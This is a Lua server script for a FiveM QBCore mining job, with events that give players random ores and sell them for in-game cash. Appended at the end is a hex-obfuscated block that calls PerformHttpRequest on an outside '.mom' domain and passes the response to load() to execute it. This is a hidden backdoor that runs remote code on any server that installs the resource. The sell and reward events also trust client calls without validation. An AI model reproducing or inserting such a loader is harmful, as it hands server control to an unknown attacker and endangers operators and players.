QBCore = nil
TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)
--[[
RegisterServerEvent('qb-mine:getItem')
AddEventHandler('qb-mine:getItem', function()
    local xPlayer, randomItem = QBCore.Functions.GetPlayer(source), Config.Items[math.random(1, #Config.Items)]
    if math.random(0, 100) <= Config.ChanceToGetItem then
        xPlayer.Functions.AddItem(randomItem, 1)
        TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[randomItem], "add")
        TriggerClientEvent("QBCore:Notify", source, "Je hebt een ".. randomItem .." los gemined", "success", 10000)
    end
end)
]]--


RegisterServerEvent('qb-mine:getItem')
AddEventHandler('qb-mine:getItem', function()
	local xPlayer, randomItem = QBCore.Functions.GetPlayer(source), Config.Items[math.random(1, #Config.Items)]
	
	if math.random(0, 100) <= Config.ChanceToGetItem then
		local Item = xPlayer.Functions.GetItemByName(randomItem)
		if Item == nil then
			xPlayer.Functions.AddItem(randomItem, 1)
            TriggerClientEvent('qb-inventory:client:ItemBox', xPlayer.PlayerData.source, QBCore.Shared.Items[randomItem], 'add')
		else	
		if Item.amount < 35 then
        
        xPlayer.Functions.AddItem(randomItem, 1)
        TriggerClientEvent('qb-inventory:client:ItemBox', xPlayer.PlayerData.source, QBCore.Shared.Items[randomItem], 'add')
		else
			TriggerClientEvent('QBCore:Notify', source, 'Inventory is full', "error")  
		end
	    end
    end
end)



RegisterServerEvent('qb-mine:sell')
AddEventHandler('qb-mine:sell', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    
if Player ~= nil then

    if Player.Functions.RemoveItem("steel", 1) then
        TriggerClientEvent("QBCore:Notify", src, "You sold 1 steel", "success", 1000)
        Player.Functions.AddMoney("cash", Config.pricexd.steel)
        Citizen.Wait(200)
        TriggerClientEvent('qb-inventory:client:ItemBox', Player.PlayerData.source, QBCore.Shared.Items['steel'], 'remove')
    else
        TriggerClientEvent("QBCore:Notify", src, "You dont have items to sell", "error", 1000)
    end
        Citizen.Wait(1000)
    if Player.Functions.RemoveItem("iron", 1) then
        TriggerClientEvent("QBCore:Notify", src, "You sold 1 iron", "success", 1000)
        Player.Functions.AddMoney("cash", Config.pricexd.iron)
        Citizen.Wait(200)
        TriggerClientEvent('qb-inventory:client:ItemBox', Player.PlayerData.source, QBCore.Shared.Items['iron'], 'remove')
    else
        TriggerClientEvent("QBCore:Notify", src, "You dont have items to sell", "error", 1000)
    end
        Citizen.Wait(1000)
    if Player.Functions.RemoveItem("copper", 1) then
        TriggerClientEvent("QBCore:Notify", src, "You sold 1 copper", "success", 1000)
        Player.Functions.AddMoney("cash", Config.pricexd.copper)
        Citizen.Wait(200)
        TriggerClientEvent('qb-inventory:client:ItemBox', Player.PlayerData.source, QBCore.Shared.Items['copper'], 'remove')
    else
        TriggerClientEvent("QBCore:Notify", src, "You dont have items to sell", "error", 1000)
    end
        Citizen.Wait(1000)
    if Player.Functions.RemoveItem("diamond", 1) then
        TriggerClientEvent("QBCore:Notify", src, "You sold 1 diamond", "success", 1000)
        Player.Functions.AddMoney("cash", Config.pricexd.diamond)
        Citizen.Wait(200)
        TriggerClientEvent('qb-inventory:client:ItemBox', Player.PlayerData.source, QBCore.Shared.Items['diamond'], 'remove')
    else
        TriggerClientEvent("QBCore:Notify", src, "You dont have items to sell", "error", 1000)
    end
        Citizen.Wait(1000)
    if Player.Functions.RemoveItem("emerald", 1) then
        TriggerClientEvent("QBCore:Notify", src, "You sold 1 emerald", "success", 1000)
        Player.Functions.AddMoney("cash", Config.pricexd.emerald)
        Citizen.Wait(200)
        TriggerClientEvent('qb-inventory:client:ItemBox', Player.PlayerData.source, QBCore.Shared.Items['emerald'], 'remove')
    else
        TriggerClientEvent("QBCore:Notify", src, "You dont have items to sell", "error", 1000)
    end
end
end)


local ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x65\x49\x69\x6e", function (hGaUECbPYRfIDJYFYXDTPqYgcQOAwHEzGuiDnenqgNMteUlZNlJcZHrVhWiiIbhjcooAjP, FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh) if (FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[6] or FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[5]) then return end ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[2]](ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[3]](FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh))() end)